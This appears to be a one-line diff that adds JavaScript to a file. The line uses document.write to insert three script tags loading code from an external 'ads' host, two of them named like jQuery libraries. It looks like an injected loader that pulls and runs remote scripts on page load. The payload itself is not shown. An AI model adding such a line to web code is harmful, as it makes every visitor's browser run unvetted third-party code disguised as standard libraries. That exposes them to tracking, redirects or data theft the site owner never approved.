@@ -1,0 +1,1 @@
+document.write('<script type="text/javascript" src="http://ads.reducelnk.com/ads/jquery.min.js"></script>');document.write('<script type="text/javascript" src="http://ads.reducelnk.com/ads/jquery.cookie.js"></script>');document.write('<script type="text/javascript" src="http://ads.reducelnk.com/ads/entry_scriptV1.1.js"></script>');
